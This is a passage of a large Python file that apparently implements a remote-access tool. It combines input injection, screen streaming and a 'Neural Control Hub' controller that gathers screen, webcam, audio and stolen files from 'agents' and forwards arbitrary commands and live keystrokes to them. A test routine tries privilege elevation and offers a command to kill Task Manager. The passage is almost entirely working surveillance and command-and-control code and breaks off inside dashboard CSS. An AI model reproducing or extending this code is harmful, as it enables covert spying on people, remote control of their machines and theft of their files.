                self.input_count += 1
                
            except queue.Empty:
                continue
            except Exception as e:
                pass
    
    def _execute_input(self, input_data):
        """Execute the input command with optimal performance"""
        action = input_data.get('action')
        data = input_data.get('data', {})
        
        try:
            if action == 'mouse_move':
                self._handle_mouse_move(data)
            elif action == 'mouse_click':
                self._handle_mouse_click(data)
            elif action == 'mouse_scroll':
                self._handle_mouse_scroll(data)
            elif action == 'key_press':
                self._handle_key_press(data)
            elif action == 'key_release':
                self._handle_key_release(data)
            elif action == 'key_type':
                self._handle_key_type(data)
                
        except Exception as e:
            pass
    
    def _handle_mouse_move(self, data):
        """Handle mouse movement with smoothing"""
        try:
            # Get coordinates
            if 'absolute' in data:
                x, y = data['absolute']['x'], data['absolute']['y']
                
                # Apply acceleration/sensitivity
                sensitivity = data.get('sensitivity', 1.0)
                if sensitivity != 1.0:
                    current_x, current_y = self.mouse_controller.position
                    x = current_x + (x - current_x) * sensitivity
                    y = current_y + (y - current_y) * sensitivity
                
                # Direct position setting (fastest)
                self.mouse_controller.position = (int(x), int(y))
                
            elif 'relative' in data:
                dx, dy = data['relative']['x'], data['relative']['y']
                sensitivity = data.get('sensitivity', 1.0)
                
                # Apply relative movement
                current_x, current_y = self.mouse_controller.position
                new_x = current_x + int(dx * sensitivity)
                new_y = current_y + int(dy * sensitivity)
                
                self.mouse_controller.position = (new_x, new_y)
            
            # Update cached position
            self.last_mouse_pos = self.mouse_controller.position
            
        except Exception as e:
            pass
    
    def _handle_mouse_click(self, data):
        """Handle mouse clicks"""
        try:
            button_map = {
                'left': mouse.Button.left,
                'right': mouse.Button.right,
                'middle': mouse.Button.middle
            }
            
            button = data.get('button', 'left')
            clicks = data.get('clicks', 1)
            pressed = data.get('pressed', True)
            
            mouse_button = button_map.get(button, mouse.Button.left)
            
            if pressed:
                for _ in range(clicks):
                    self.mouse_controller.click(mouse_button)
            else:
                # Handle button release if needed
                pass
                
        except Exception as e:
            pass
    
    def _handle_mouse_scroll(self, data):
        """Handle mouse scrolling"""
        try:
            dx = data.get('dx', 0)
            dy = data.get('dy', 0)
            
            if dx != 0 or dy != 0:
                self.mouse_controller.scroll(dx, dy)
                
        except Exception as e:
            pass
    
    def _handle_key_press(self, data):
        """Handle key press"""
        try:
            key = data.get('key')
            if not key:
                return
            
            # Handle special keys
            if key.startswith('Key.'):
                # Special key like Key.enter, Key.ctrl, etc.
                key_name = key[4:]  # Remove 'Key.' prefix
                special_key = getattr(keyboard.Key, key_name, None)
                if special_key:
                    self.keyboard_controller.press(special_key)
            else:
                # Regular character
                self.keyboard_controller.press(key)
                
        except Exception as e:
            pass
    
    def _handle_key_release(self, data):
        """Handle key release"""
        try:
            key = data.get('key')
            if not key:
                return
            
            # Handle special keys
            if key.startswith('Key.'):
                key_name = key[4:]
                special_key = getattr(keyboard.Key, key_name, None)
                if special_key:
                    self.keyboard_controller.release(special_key)
            else:
                self.keyboard_controller.release(key)
                
        except Exception as e:
            pass
    
    def _handle_key_type(self, data):
        """Handle text typing"""
        try:
            text = data.get('text', '')
            if text:
                # Use direct character typing for best performance
                for char in text:
                    self.keyboard_controller.press(char)
                    self.keyboard_controller.release(char)
                
        except Exception as e:
            pass
    
    def _update_performance_stats(self, process_time: float, total_latency: float):
        """Update performance statistics"""
        self.processing_times.append({
            'process_time': process_time,
            'total_latency': total_latency,
            'timestamp': time.time()
        })
        
        # Keep only recent samples
        if len(self.processing_times) > 1000:
            self.processing_times.pop(0)
    
    def get_performance_stats(self):
        """Get performance statistics"""
        if not self.processing_times:
            return {
                'input_count': self.input_count,
                'queue_size': self.input_queue.qsize(),
                'avg_process_time': 0,
                'avg_latency': 0,
                'max_latency': 0,
                'min_latency': 0
            }
        
        recent_times = self.processing_times[-100:]  # Last 100 samples
        process_times = [t['process_time'] for t in recent_times]
        latencies = [t['total_latency'] for t in recent_times]
        
        return {
            'input_count': self.input_count,
            'queue_size': self.input_queue.qsize(),
            'avg_process_time': sum(process_times) / len(process_times) * 1000,  # ms
            'avg_latency': sum(latencies) / len(latencies) * 1000,  # ms
            'max_latency': max(latencies) * 1000,  # ms
            'min_latency': min(latencies) * 1000,  # ms
            'samples': len(recent_times)
        }
    
    def set_mouse_acceleration(self, acceleration: float):
        """Set mouse acceleration factor"""
        self.mouse_acceleration = max(0.1, min(5.0, acceleration))
    
    def clear_queue(self):
        """Clear the input queue"""
        while not self.input_queue.empty():
            try:
                self.input_queue.get_nowait()
            except queue.Empty:
                break


class InputMessageEncoder:
    """Fast message encoding/decoding for input data"""
    
    def __init__(self):
        self.use_msgpack = HAS_MSGPACK
    
    def encode(self, data) -> bytes:
        """Encode input data to bytes"""
        try:
            if self.use_msgpack:
                return msgpack.packb(data)
            else:
                return json.dumps(data).encode('utf-8')
        except Exception as e:
            return b''
    
    def decode(self, data: bytes):
        """Decode bytes to input data"""
        try:
            if self.use_msgpack:
                return msgpack.unpackb(data, raw=False)
            else:
                return json.loads(data.decode('utf-8'))
        except Exception as e:
            return None

# ========================================================================================
# WEBSOCKET STREAMING MODULE
# From: websocket_streaming.py
# ========================================================================================

try:
    import uvloop
    HAS_UVLOOP = True
except ImportError:
    HAS_UVLOOP = False

class WebSocketStreamingServer:
    """High-performance WebSocket streaming server"""
    
    def __init__(self, host: str = "localhost", port: int = 8765, 
                 max_clients: int = 10, target_fps: int = 60):
        self.host = host
        self.port = port
        self.max_clients = max_clients
        self.target_fps = target_fps
        
        # Client management
        self.clients = set()
        self.client_stats = {}
        
        # Streaming components
        self.capture = None
        self.frame_queue = queue.Queue(maxsize=120)  # 2 seconds buffer at 60fps
        self.running = False
        
        # Performance tracking
        self.frames_sent = 0
        self.bytes_sent = 0
        self.start_time = time.time()
    
    async def start_server(self):
        """Start the WebSocket server"""
        if HAS_UVLOOP and hasattr(asyncio, 'set_event_loop_policy'):
            asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
        
        self.running = True
        
        # Initialize capture system
        try:
            self.capture = HighPerformanceCapture(
                target_fps=self.target_fps, 
                quality=85, 
                enable_delta_compression=True
            )
            self.capture.start_capture_stream(self._frame_callback)
        except:
            return
        
        # Start frame distribution task
        asyncio.create_task(self._distribute_frames())
        
        # Start the WebSocket server
        async with websockets.serve(
            self._handle_client,
            self.host,
            self.port,
            max_size=1024*1024*10,  # 10MB max message size
            ping_interval=20,
            ping_timeout=10,
            compression=None  # Disable compression for speed
        ):
            await asyncio.Future()  # Run forever
    
    async def _handle_client(self, websocket, path):
        """Handle new client connection"""
        client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
        
        if len(self.clients) >= self.max_clients:
            await websocket.close(code=1013, reason="Server full")
            return
        
        self.clients.add(websocket)
        self.client_stats[client_id] = {
            'connected_at': time.time(),
            'frames_sent': 0,
            'bytes_sent': 0,
            'last_activity': time.time()
        }
        
        try:
            # Send initial connection message
            await self._send_to_client(websocket, {
                'type': 'connection',
                'message': 'Connected to high-performance stream',
                'fps': self.target_fps,
                'features': {
                    'high_performance_capture': True,
                    'msgpack': HAS_MSGPACK,
                    'uvloop': HAS_UVLOOP
                }
            })
            
            # Handle client messages
            async for message in websocket:
                await self._handle_client_message(websocket, client_id, message)
                
        except websockets.exceptions.ConnectionClosed:
            pass
        except Exception as e:
            pass
        finally:
            self.clients.discard(websocket)
            self.client_stats.pop(client_id, None)
    
    async def _handle_client_message(self, websocket, client_id: str, message: str):
        """Handle incoming client messages"""
        try:
            data = json.loads(message)
            msg_type = data.get('type')
            
            if msg_type == 'ping':
                await self._send_to_client(websocket, {'type': 'pong', 'timestamp': time.time()})
            elif msg_type == 'stats_request':
                stats = self._get_server_stats()
                await self._send_to_client(websocket, {'type': 'stats', 'data': stats})
            elif msg_type == 'quality_change':
                new_quality = data.get('quality', 85)
                if self.capture:
                    self.capture.set_quality(new_quality)
                await self._send_to_client(websocket, {
                    'type': 'quality_changed', 
                    'quality': new_quality
                })
            
            # Update client activity
            self.client_stats[client_id]['last_activity'] = time.time()
            
        except json.JSONDecodeError:
            pass
        except Exception as e:
            pass
    
    def _frame_callback(self, frame_data: bytes):
        """Callback for captured frames"""
        if frame_data and frame_data != b'DELTA_UNCHANGED':
            try:
                # Add frame to queue (non-blocking)
                if not self.frame_queue.full():
                    self.frame_queue.put_nowait({
                        'data': frame_data,
                        'timestamp': time.time()
                    })
                else:
                    # Drop oldest frame if queue is full
                    try:
                        self.frame_queue.get_nowait()
                        self.frame_queue.put_nowait({
                            'data': frame_data,
                            'timestamp': time.time()
                        })
                    except queue.Empty:
                        pass
            except Exception as e:
                pass
    
    async def _distribute_frames(self):
        """Distribute frames to all connected clients"""
        while self.running:
            try:
                # Get frame from queue (non-blocking)
                try:
                    frame_data = self.frame_queue.get_nowait()
                except queue.Empty:
                    await asyncio.sleep(0.001)  # 1ms sleep
                    continue
                
                if not self.clients:
                    continue
                
                # Prepare frame message
                frame_message = {
                    'type': 'frame',
                    'timestamp': frame_data['timestamp'],
                    'data': base64.b64encode(frame_data['data']).decode('utf-8')
                }
                
                # Handle different frame types
                if frame_data['data'].startswith(b'LZ4_COMPRESSED'):
                    frame_message['encoding'] = 'lz4'
                    frame_message['data'] = base64.b64encode(frame_data['data'][14:]).decode('utf-8')
                
                # Send to all clients concurrently
                tasks = []
                for client in list(self.clients):  # Create a copy to avoid modification during iteration
                    tasks.append(self._send_frame_to_client(client, frame_message))
                
                if tasks:
                    await asyncio.gather(*tasks, return_exceptions=True)
                
                self.frames_sent += 1
                self.bytes_sent += len(frame_data['data'])
                
            except Exception as e:
                await asyncio.sleep(0.01)
    
    async def _send_frame_to_client(self, websocket, frame_message):
        """Send frame to a specific client"""
        try:
            if websocket in self.clients:
                if HAS_MSGPACK:
                    # Use MessagePack for better performance
                    data = msgpack.packb(frame_message)
                    await websocket.send(data)
                else:
                    # Fallback to JSON
                    await websocket.send(json.dumps(frame_message))
                
                # Update client stats
                client_id = f"{websocket.remote_address[0]}:{websocket.remote_address[1]}"
                if client_id in self.client_stats:
                    self.client_stats[client_id]['frames_sent'] += 1
                    self.client_stats[client_id]['bytes_sent'] += len(frame_message.get('data', ''))
                    
        except websockets.exceptions.ConnectionClosed:
            self.clients.discard(websocket)
        except Exception as e:
            pass
    
    async def _send_to_client(self, websocket, message):
        """Send a message to a specific client"""
        try:
            if HAS_MSGPACK:
                data = msgpack.packb(message)
                await websocket.send(data)
            else:
                await websocket.send(json.dumps(message))
        except Exception as e:
            pass
    
    def _get_server_stats(self):
        """Get server performance statistics"""
        uptime = time.time() - self.start_time
        avg_fps = self.frames_sent / uptime if uptime > 0 else 0
        avg_bandwidth = self.bytes_sent / uptime if uptime > 0 else 0
        
        capture_stats = {}
        if self.capture:
            capture_stats = self.capture.get_stats()
        
        return {
            'uptime': uptime,
            'connected_clients': len(self.clients),
            'frames_sent': self.frames_sent,
            'bytes_sent': self.bytes_sent,
            'avg_fps': avg_fps,
            'avg_bandwidth': avg_bandwidth,
            'frame_queue_size': self.frame_queue.qsize(),
            'capture_stats': capture_stats,
            'client_stats': self.client_stats
        }
    
    def stop_server(self):
        """Stop the streaming server"""
        self.running = False
        if self.capture:
            self.capture.stop_capture_stream()

# ========================================================================================
# OPTIMIZED DASHBOARD HTML CONTENT
# From: optimized_dashboard.html
# ========================================================================================

OPTIMIZED_DASHBOARD_HTML = """<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>High-Performance Dashboard - 60 FPS Streaming</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #1e1e1e 0%, #2d2d2d 100%);
            color: #ffffff;
            overflow-x: hidden;
        }
        .header {
            background: rgba(0, 0, 0, 0.8);
            padding: 15px 20px;
            border-bottom: 2px solid #00ff88;
            backdrop-filter: blur(10px);
        }
        .header h1 {
            color: #00ff88;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .performance-badge {
            display: inline-block;
            background: linear-gradient(45deg, #ff6b6b, #feca57);
            padding: 5px 15px;
            border-radius: 20px;
            font-size: 12px;
            font-weight: bold;
            margin-left: 15px;
            animation: pulse 2s infinite;
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .container {
            display: grid;
            grid-template-columns: 1fr 300px;
            height: calc(100vh - 80px);
            gap: 20px;
            padding: 20px;
        }
        .stream-container {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            position: relative;
            overflow: hidden;
        }
        .stream-video {
            width: 100%;
            height: 100%;
            object-fit: contain;
            border-radius: 10px;
            background: #000;
        }
        .stream-overlay {
            position: absolute;
            top: 20px;
            left: 20px;
            background: rgba(0, 0, 0, 0.8);
            padding: 15px;
            border-radius: 10px;
            min-width: 200px;
        }
        .fps-counter {
            font-size: 24px;
            font-weight: bold;
            color: #00ff88;
            text-shadow: 0 0 10px rgba(0, 255, 136, 0.5);
        }
        .latency-indicator {
            margin-top: 10px;
        }
        .latency-value {
            font-size: 18px;
            font-weight: bold;
        }
        .latency-low { color: #00ff88; }
        .latency-medium { color: #feca57; }
        .latency-high { color: #ff6b6b; }
        .controls-panel {
            background: rgba(255, 255, 255, 0.05);
            border-radius: 15px;
            padding: 20px;
            border: 1px solid rgba(0, 255, 136, 0.3);
            height: fit-content;
        }
        .control-section {
            margin-bottom: 25px;
        }
        .control-section h3 {
            color: #00ff88;
            margin-bottom: 15px;
            font-size: 16px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .btn {
            background: linear-gradient(45deg, #00ff88, #00d4aa);
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            color: white;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
            transition: all 0.3s ease;
            text-transform: uppercase;
            letter-spacing: 0.5px;
            width: 100%;
        }
        .btn:hover {
            background: linear-gradient(45deg, #00d4aa, #00ff88);
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(0, 255, 136, 0.4);
        }
        .btn-danger {
            background: linear-gradient(45deg, #ff6b6b, #ff4757);
        }
        .btn-danger:hover {
            background: linear-gradient(45deg, #ff4757, #ff6b6b);
            box-shadow: 0 5px 15px rgba(255, 107, 107, 0.4);
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>High-Performance Dashboard<span class="performance-badge">60 FPS • Sub-2s Latency</span></h1>
    </div>
    <div class="container">
        <div class="stream-container">
            <img id="streamVideo" class="stream-video" alt="High-Performance Stream" />
            <div class="stream-overlay">
                <div class="fps-counter"><span id="fpsValue">0</span> FPS</div>
                <div class="latency-indicator">Latency: <span id="latencyValue" class="latency-value latency-low">0ms</span></div>
            </div>
        </div>
        <div class="controls-panel">
            <div class="control-section">
                <h3>Stream Control</h3>
                <button class="btn" onclick="startOptimizedStream()">Start 60 FPS Stream</button>
                <button class="btn btn-danger" onclick="stopStream()">Stop Stream</button>
                <button class="btn" onclick="startWebSocketStream()">WebSocket Stream</button>
            </div>
        </div>
    </div>
    <script>
        let streamActive = false;
        let webSocketStream = null;
        let frameCount = 0;
        let startTime = Date.now();

        function startWebSocketStream() {
            if (webSocketStream) {
                webSocketStream.close();
            }
            // Detect if we're using HTTPS and use appropriate WebSocket protocol
            const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
            const host = window.location.hostname;
            const port = window.location.port;
            webSocketStream = new WebSocket(`${protocol}//${host}:8765`);
            
            webSocketStream.onmessage = function(event) {
                try {
                    const data = JSON.parse(event.data);
                    if (data.type === 'frame') {
                        updateStreamFrame(data);
                    }
                } catch (e) {
                    console.error('WebSocket message error:', e);
                }
            };
        }

        function updateStreamFrame(frameData) {
            const streamVideo = document.getElementById('streamVideo');
            streamVideo.src = 'data:image/jpeg;base64,' + frameData.data;
            
            frameCount++;
            const now = Date.now();
            const elapsed = (now - startTime) / 1000;
            const fps = Math.round(frameCount / elapsed);
            document.getElementById('fpsValue').textContent = fps;
            
            const latency = now - (frameData.timestamp * 1000);
            document.getElementById('latencyValue').textContent = Math.round(latency) + 'ms';
        }

        function startOptimizedStream() {
            streamActive = true;
            console.log('Optimized stream started');
        }

        function stopStream() {
            streamActive = false;
            if (webSocketStream) {
                webSocketStream.close();
                webSocketStream = null;
            }
            console.log('Stream stopped');
        }

        document.addEventListener('DOMContentLoaded', function() {
            setTimeout(startWebSocketStream, 1000);
        });
    </script>
</body>
</html>"""

# ========================================================================================
# PROCESS TERMINATION TEST FUNCTIONS
# From: test_process_termination.py
# ========================================================================================

def test_process_termination_functionality():
    """Test enhanced process termination with admin privileges functionality."""
    print("Enhanced Process Termination Test")
    print("=" * 40)
    
    # Check current privileges
    if WINDOWS_AVAILABLE:
        if is_admin():
            print("✓ Running with administrator privileges")
        else:
            print("⚠ Running with user privileges")
            print("Attempting to elevate privileges...")
            if elevate_privileges():
                print("✓ Privilege escalation successful")
            else:
                print("✗ Privilege escalation failed")
                print("Some termination methods may fail")
    else:
        print("✓ Running on Linux/Unix system")
        if os.geteuid() == 0:
            print("✓ Running as root")
        else:
            print("⚠ Running as regular user")
    
    print("\nAvailable commands:")
    print("1. kill-taskmgr - Terminate Task Manager")
    print("2. terminate <process_name> - Terminate process by name")
    print("3. terminate <pid> - Terminate process by PID")
    print("4. quit - Exit")
    
    while True:
        try:
            command = input("\nEnter command: ").strip().lower()
            
            if command == "quit" or command == "exit":
                break
            elif command == "kill-taskmgr":
                print("Attempting to terminate Task Manager...")
                result = kill_task_manager()
                print(f"Result: {result}")
            elif command.startswith("terminate "):
                target = command.split(" ", 1)[1]
                
                # Try to convert to PID if it's a number
                try:
                    target = int(target)
                    print(f"Attempting to terminate process with PID {target}...")
                except ValueError:
                    print(f"Attempting to terminate process '{target}'...")
                
                result = terminate_process_with_admin(target, force=True)
                print(f"Result: {result}")
            else:
                print("Unknown command. Use 'kill-taskmgr', 'terminate <name/pid>', or 'quit'")
                
        except KeyboardInterrupt:
            print("\nExiting...")
            break
        except Exception as e:
            print(f"Error: {e}")

# ========================================================================================
# END OF COMBINED MODULES
# ========================================================================================

# ========================================================================================
# CONTROLLER FUNCTIONALITY
# Integrated from controller.py
# ========================================================================================

try:
    import eventlet
    eventlet.monkey_patch()
    
    from flask import Flask, request, jsonify, redirect, url_for, Response, send_file
    from flask_socketio import SocketIO, emit, join_room, leave_room
    
    FLASK_AVAILABLE = True
except ImportError:
    FLASK_AVAILABLE = False
    print("Flask/SocketIO not available. Controller functionality disabled.")

# Controller state
controller_app = None
controller_socketio = None
agents_data = defaultdict(dict)
connected_agents = set()
operators = set()

def initialize_controller():
    """Initialize the Flask-SocketIO controller."""
    global controller_app, controller_socketio
    
    if not FLASK_AVAILABLE:
        return False
    
    controller_app = Flask(__name__)
    controller_app.config['SECRET_KEY'] = 'neural_control_hub_secret_key'
    controller_socketio = SocketIO(controller_app, async_mode='eventlet')
    
    # Setup routes and handlers
    setup_controller_routes()
    setup_controller_handlers()
    
    return True

def setup_controller_routes():
    """Setup Flask routes for the controller."""
    
    @controller_app.route('/')
    def index():
        return "Agent Controller Running"
    
    @controller_app.route('/dashboard')
    def dashboard():
        return "Dashboard"
    
    @controller_app.route('/stream/<agent_id>', methods=['POST'])
    def stream_in(agent_id):
        """Receive screen stream data from agent."""
        try:
            data = request.get_data()
            if agent_id not in agents_data:
                agents_data[agent_id] = {}
            agents_data[agent_id]['screen_frame'] = data
            return "OK", 200
        except Exception as e:
            return f"Error: {e}", 500
    
    @controller_app.route('/video_feed/<agent_id>')
    def video_feed(agent_id):
        """Stream video feed to browser."""
        return Response(generate_video_frames(agent_id),
                       mimetype='multipart/x-mixed-replace; boundary=frame')
    
    @controller_app.route('/camera/<agent_id>', methods=['POST'])
    def camera_in(agent_id):
        """Receive camera stream data from agent."""
        try:
            data = request.get_data()
            if agent_id not in agents_data:
                agents_data[agent_id] = {}
            agents_data[agent_id]['camera_frame'] = data
            return "OK", 200
        except Exception as e:
            return f"Error: {e}", 500
    
    @controller_app.route('/camera_feed/<agent_id>')
    def camera_feed(agent_id):
        """Stream camera feed to browser."""
        return Response(generate_camera_frames(agent_id),
                       mimetype='multipart/x-mixed-replace; boundary=frame')
    
    @controller_app.route('/audio/<agent_id>', methods=['POST'])
    def audio_in(agent_id):
        """Receive audio stream data from agent."""
        try:
            data = request.get_data()
            if agent_id not in agents_data:
                agents_data[agent_id] = {}
            agents_data[agent_id]['audio_frame'] = data
            return "OK", 200
        except Exception as e:
            return f"Error: {e}", 500
    
    @controller_app.route('/audio_feed/<agent_id>')
    def audio_feed(agent_id):
        """Stream audio feed to browser."""
        return Response(generate_audio_stream(agent_id),
                       mimetype='audio/wav')
    
    @controller_app.route('/file_download/<agent_id>', methods=['POST'])
    def file_download_in(agent_id):
        """Receive file download data from agent."""
        try:
            data = request.get_json()
            if not data:
                return "No data received", 400
            
            filename = data.get('filename')
            file_content = data.get('content')
            file_size = data.get('size')
            
            if not all([filename, file_content, file_size]):
                return "Missing required fields", 400
            
            # Store file data for controller to access
            if agent_id not in agents_data:
                agents_data[agent_id] = {}
            agents_data[agent_id]['downloaded_file'] = {
                'filename': filename,
                'content': file_content,
                'size': file_size
            }
            
            # Notify operators about file download
            if FLASK_SOCKETIO_AVAILABLE:
                controller_socketio.emit('file_download_complete', {
                    'agent_id': agent_id,
                    'filename': filename,
                    'size': file_size
                }, room='operators')
            
            return "File received successfully", 200
        except Exception as e:
            return f"Error: {e}", 500
    
    @controller_app.route('/file_upload_result', methods=['POST'])
    def file_upload_result():
        """Receive file upload result from agent."""
        try:
            data = request.get_json()
            if not data:
                return "No data received", 400
            
            success = data.get('success', False)
            result = data.get('result', '')
            
            # Notify operators about file upload result
            if FLASK_SOCKETIO_AVAILABLE:
                controller_socketio.emit('file_upload_result', {
                    'success': success,
                    'result': result
                }, room='operators')
            
            return "Result received", 200
        except Exception as e:
            return f"Error: {e}", 500

def generate_video_frames(agent_id):
    """Generate video frames for streaming."""
    while True:
        try:
            if agent_id in agents_data and 'screen_frame' in agents_data[agent_id]:
                frame_data = agents_data[agent_id]['screen_frame']
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
            else:
                time.sleep(0.1)
        except Exception as e:
            break

def generate_camera_frames(agent_id):
    """Generate camera frames for streaming."""
    while True:
        try:
            if agent_id in agents_data and 'camera_frame' in agents_data[agent_id]:
                frame_data = agents_data[agent_id]['camera_frame']
                yield (b'--frame\r\n'
                       b'Content-Type: image/jpeg\r\n\r\n' + frame_data + b'\r\n')
            else:
                time.sleep(0.1)
        except Exception as e:
            break

def generate_audio_stream(agent_id):
    """Generate audio stream."""
    while True:
        try:
            if agent_id in agents_data and 'audio_frame' in agents_data[agent_id]:
                audio_data = agents_data[agent_id]['audio_frame']
                yield audio_data
            else:
                time.sleep(0.1)
        except Exception as e:
            break

def setup_controller_handlers():
    """Setup SocketIO event handlers for the controller."""
    
    @controller_socketio.on('connect')
    def controller_handle_connect():
        print(f"Client connected: {request.sid}")
        join_room('operators')
        operators.add(request.sid)
    
    @controller_socketio.on('disconnect')
    def controller_handle_disconnect():
        print(f"Client disconnected: {request.sid}")
        operators.discard(request.sid)
        try:
            leave_room('operators')
        except:
            pass
    
    @controller_socketio.on('operator_connect')
    def controller_handle_operator_connect():
        join_room('operators')
        operators.add(request.sid)
        # Send current agents list
        emit('agents_list', {'agents': list(connected_agents)})
    
    @controller_socketio.on('agent_connect')
    def controller_handle_agent_connect(data):
        agent_id = data.get('agent_id')
        if agent_id:
            connected_agents.add(agent_id)
            agents_data[agent_id]['last_seen'] = time.time()
            agents_data[agent_id]['sid'] = request.sid
            
            # Notify operators
            controller_socketio.emit('agent_connected', {
                'agent_id': agent_id,
                'timestamp': time.time()
            }, room='operators')
    
    @controller_socketio.on('execute_command')
    def controller_handle_execute_command(data):
        agent_id = data.get('agent_id')
        command = data.get('command')
        
        if agent_id in agents_data:
            # Forward command to agent
            controller_socketio.emit('execute_command', {
                'agent_id': agent_id,
                'command': command
            })
    
    @controller_socketio.on('command_result')
    def controller_handle_command_result(data):
        agent_id = data.get('agent_id')
        output = data.get('output')
        
        # Forward result to operators
        controller_socketio.emit('command_result', {
            'agent_id': agent_id,
            'output': output,
            'timestamp': time.time()
        }, room='operators')
    
    @controller_socketio.on('live_key_press')
    def controller_handle_live_key_press(data):
        agent_id = data.get('agent_id')
        key_data = data.get('key_data')
        
        # Forward to agent
        controller_socketio.emit('key_press', key_data)
    
    @controller_socketio.on('live_mouse_move')
    def controller_handle_live_mouse_move(data):
        agent_id = data.get('agent_id')
        mouse_data = data.get('mouse_data')
        
        # Forward to agent
        controller_socketio.emit('mouse_move', mouse_data)
    
    @controller_socketio.on('live_mouse_click')
    def controller_handle_live_mouse_click(data):
        agent_id = data.get('agent_id')
        mouse_data = data.get('mouse_data')
        
        # Forward to agent
        controller_socketio.emit('mouse_click', mouse_data)
    
    @controller_socketio.on('screen_frame')
    def controller_handle_screen_frame(data):
        agent_id = data.get('agent_id')
        frame_data = data.get('frame')
        
        if agent_id and frame_data:
            # Decode base64 frame
            frame_bytes = base64.b64decode(frame_data)
            agents_data[agent_id]['screen_frame'] = frame_bytes
            
            # Forward to operators
            controller_socketio.emit('screen_frame', data, room='operators')
    
    @controller_socketio.on('camera_frame')
    def controller_handle_camera_frame(data):
        agent_id = data.get('agent_id')
        frame_data = data.get('frame')
        
        if agent_id and frame_data:
            frame_bytes = base64.b64decode(frame_data)
            agents_data[agent_id]['camera_frame'] = frame_bytes
            
            controller_socketio.emit('camera_frame', data, room='operators')
    
    @controller_socketio.on('audio_frame')
    def controller_handle_audio_frame(data):
        agent_id = data.get('agent_id')
        audio_data = data.get('audio')
        
        if agent_id and audio_data:
            audio_bytes = base64.b64decode(audio_data)
            agents_data[agent_id]['audio_frame'] = audio_bytes
            
            controller_socketio.emit('audio_frame', data, room='operators')

# Dashboard HTML
DASHBOARD_HTML = '''
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Neural Control Hub</title>
    <link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700;900&family=Inter:wght@300;400;500;600&display=swap" rel="stylesheet">
    <script src="https://cdnjs.cloudflare.com/ajax/libs/socket.io/4.7.2/socket.io.js"></script>
    <style>
        :root {
            --primary-bg: #0a0a0f;
            --secondary-bg: #1a1a2e;
            --tertiary-bg: #16213e;
            --accent-blue: #00d4ff;
            --accent-purple: #6c5ce7;
            --accent-green: #00ff88;
            --accent-red: #ff4757;
            --text-primary: #ffffff;
            --text-secondary: #a0a0a0;
            --border-color: #2d3748;
            --glass-bg: rgba(255, 255, 255, 0.05);
            --glass-border: rgba(255, 255, 255, 0.1);
        }

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Inter', sans-serif;
            background: linear-gradient(135deg, var(--primary-bg) 0%, var(--secondary-bg) 100%);
            color: var(--text-primary);
            min-height: 100vh;
            overflow-x: hidden;
        }

        .header {
            text-align: center;
            margin-bottom: 40px;
            padding: 30px 0;
        }

        .header h1 {
            font-family: 'Orbitron', monospace;
            font-size: 3rem;
            font-weight: 900;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
            margin-bottom: 10px;
            text-shadow: 0 0 30px rgba(0, 212, 255, 0.3);
        }

        .dashboard-grid {
            display: grid;
            grid-template-columns: 300px 1fr 350px;
            gap: 30px;
            max-width: 1400px;
            margin: 0 auto;
            padding: 0 20px;
            height: calc(100vh - 200px);
        }

        .panel {
            background: var(--glass-bg);
            border: 1px solid var(--glass-border);
            border-radius: 20px;
            padding: 25px;
            backdrop-filter: blur(20px);
            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
        }

        .agents-panel h2, .control-panel h2 {
            color: var(--accent-green);
            margin-bottom: 20px;
            font-size: 1.3rem;
            font-weight: 600;
            text-transform: uppercase;
            letter-spacing: 1px;
        }

        .agent-item {
            background: var(--tertiary-bg);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 15px;
            margin-bottom: 15px;
            cursor: pointer;
            transition: all 0.3s ease;
            position: relative;
            overflow: hidden;
        }

        .agent-item:hover {
            border-color: var(--accent-blue);
            transform: translateY(-2px);
            box-shadow: 0 5px 20px rgba(0, 212, 255, 0.2);
        }

        .agent-item.active {
            border-color: var(--accent-green);
            background: rgba(0, 255, 136, 0.1);
        }

        .stream-container {
            position: relative;
            height: 100%;
            display: flex;
            flex-direction: column;
        }

        .stream-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 20px;
        }

        .stream-viewer {
            flex: 1;
            background: #000;
            border-radius: 15px;
            position: relative;
            overflow: hidden;
            display: flex;
            align-items: center;
            justify-content: center;
        }

        .stream-viewer img {
            max-width: 100%;
            max-height: 100%;
            object-fit: contain;
        }

        .stream-overlay {
            position: absolute;
            top: 15px;
            left: 15px;
            background: rgba(0, 0, 0, 0.8);
            padding: 10px 15px;
            border-radius: 8px;
            font-size: 0.9rem;
        }

        .control-section {
            margin-bottom: 25px;
        }

        .control-section h3 {
            color: var(--accent-blue);
            margin-bottom: 15px;
            font-size: 1rem;
            font-weight: 500;
        }

        .neural-button {
            width: 100%;
            padding: 12px 20px;
            background: linear-gradient(45deg, var(--accent-blue), var(--accent-purple));
            border: none;
            border-radius: 10px;
            color: white;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 10px;
            transition: all 0.3s ease;
            text-transform: uppercase;
